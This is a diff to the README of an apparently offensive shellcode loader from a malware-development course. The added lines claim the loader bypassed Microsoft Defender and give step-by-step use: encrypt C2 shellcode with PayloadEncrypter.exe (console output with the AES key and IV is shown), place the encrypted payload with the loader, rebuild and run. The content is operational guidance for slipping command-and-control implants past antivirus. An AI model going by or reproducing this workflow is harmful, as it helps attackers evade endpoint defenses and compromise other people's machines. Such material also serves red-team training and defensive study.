@@ -1,5 +1,24 @@
 # MaldevAcademyLdr.1
 
+## Actual (Bypassed Defender 20231024)
+
+## How to use 20231024
+- Create a binary shellcode, could be your favorite C2.
+
+```
+PS Z:\Def-Evasion\MaldevAcademyLdr.1\x64\Debug> .\PayloadEncrypter.exe .\payload_x64.bin
+[i] Reading .\payload_x64.bin From The Disk ... [+] DONE
+[i] Generating AES Key and IV:
+        <i> AES KEY : [ C0 B0 F4 B6 26 59 8B DB 1C E2 DC FE BE CE A6 E1 22 A1 D8 01 25 7A 91 B4 E8 49 E7 5D 0A 15 49 E1 ]
+        <i> AES IV  : [ 98 C1 B8 2D F4 E5 D5 2B C4 51 71 0D 94 35 1E 64 ]
+[i] Final Payload Size: 976
+[i] Writing "Payload.ctaes" To The Disk ... [+] DONE
+[*] The Payload Is Ready To Go!
+```
+
+- Copy the Payload.ctaes to the loader directory.
+- Rebuild the Loader tool, and execute.
+
 ## Quick Links
 
 * Maldev Academy Home - https://maldevacademy.com
